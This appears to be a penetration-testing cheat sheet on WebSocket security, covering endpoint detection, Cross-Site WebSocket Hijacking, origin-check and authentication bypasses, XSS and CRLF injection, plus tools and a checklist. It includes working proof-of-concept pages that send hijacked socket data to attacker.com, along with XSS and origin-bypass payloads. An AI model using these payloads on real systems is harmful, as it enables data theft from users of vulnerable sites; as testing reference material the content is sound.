---
tags:
  - medium
  - client-side
---

# WebSocket Security

WebSocket vulnerabilities bypass traditional HTTP security: authentication at handshake without per-message validation, CSWSH (Cross-Site WebSocket Hijacking) via weak origin checks, and thread-local auth pollution.

## Detection

**WebSocket endpoints:**
```
/socket.io/
/ws/
/websocket/
/graphql (subscriptions)
/cable (ActionCable)
/hub (SignalR)
```

Browser DevTools → Network → WS filter

**Authentication analysis:**
- Auth happens at handshake only?
- Test with expired/invalid tokens
- Test permission levels per subscription
- Compare HTTP vs WebSocket authorization

## Attack Vectors

### 1. Cross-Site WebSocket Hijacking (CSWSH)

**Basic CSWSH payload:**
```html
<script>
var ws = new WebSocket('wss://target.com/socket');
ws.onopen = function() {
    ws.send(JSON.stringify({type: 'get_sensitive_data'}));
};
ws.onmessage = function(e) {
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: e.data
    });
};
</script>
```

**Full PoC template:**
```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
var ws = new WebSocket('wss://TARGET/socket');
ws.onopen = function() {
    console.log('Connected');
    ws.send('{"action":"get_data"}');
};
ws.onmessage = function(e) {
    console.log('Received:', e.data);
    new Image().src = 'https://attacker.com/log?data=' + encodeURIComponent(e.data);
};
ws.onerror = function(e) { console.log('Error:', e); };
ws.onclose = function() { console.log('Closed'); };
</script>
</body>
</html>
```

### 2. Origin Bypass Techniques

```
legitimate.com.evil.com     # Subdomain prefix
evil.com                    # No validation
target.com.attacker.com     # Weak regex
null                        # Null origin
                            # Empty origin
```

### 3. Authentication Bypass

**Thread-local security context pollution (Spring):**
```http
GET /go/agent-websocket HTTP/1.1
Host: target.com
```

After agent auth, unauthenticated requests randomly succeed when hitting same thread. Impact: Complete auth bypass.

**Permission validation bypass:**
```javascript
ws = new WebSocket("wss://target.com/graphql?shop_id={id}");

// Auth succeeds even without permissions
ws.send(JSON.stringify({
    "type": "connection_init",
    "payload": {"Authorization": "{valid_token}"}
}));

// Subscribe to privileged events
ws.send(JSON.stringify({
    "id": "1",
    "type": "start",
    "payload": {
        "variables": {"eventName": "conversation"},
        "query": "subscription { eventReceived { payload } }"
    }
}));
```

**Events to test:** `conversation`, `message`, `participant`, `read_state`

### 4. Information Disclosure

WebSocket broadcasts leak user data:
- User emails, names in connection events
- Hashed credentials in workspace member events
- Admin data in real-time updates

### 5. Message Injection / XSS

**Socket.IO XSS:**
```javascript
socket.emit('message', '<img src=x onerror=alert(document.domain)>');
```

Test in: Chat apps, notifications, live updates, gaming.

**Live search poisoning:**
```json
{"<img src=1 onerror=alert(document.domain)>": "XSS attribute"}
```

### 6. CRLF to WebSocket Access

```http
GET /#password_reset/%0d%0aSet-Cookie:%20bypass=true HTTP/1.1
```

## Bypasses

**Origin validation:**
```
evil.target.com.attacker.com   # Regex bypass
target.com.evil.com            # Subdomain prefix
null                           # Null origin
```

**Authentication:**
- Repeated requests until hitting authenticated thread
- Use valid low-privilege token for high-privilege subscriptions
- Check if token validation occurs only at handshake

## Real Examples

| Target | Technique | Impact |
|--------|-----------|--------|
| GoCD | Thread-local pollution | Complete auth bypass |
| Shopify GraphQL | Permission bypass subscriptions | Data leak |
| GitLab | CRLF injection | WebSocket data exposure |

## Tools

**CLI testing:**
```bash
# websocat
websocat wss://target.com/socket
echo '{"type":"ping"}' | websocat wss://target.com/socket
```

**Caido:**
- Proxy → WebSocket history
- Repeater supports WebSocket
- Intercept and modify messages

## Checklist

- [ ] Identify WebSocket endpoints
- [ ] Analyze authentication model (handshake vs per-message)
- [ ] Test with expired/invalid tokens
- [ ] Test permission escalation via subscriptions
- [ ] CSWSH with modified Origin
- [ ] XSS in real-time messages
- [ ] Monitor for unexpected data in broadcasts
- [ ] Check thread-local auth issues (repeat requests)
- [ ] CRLF injection for access
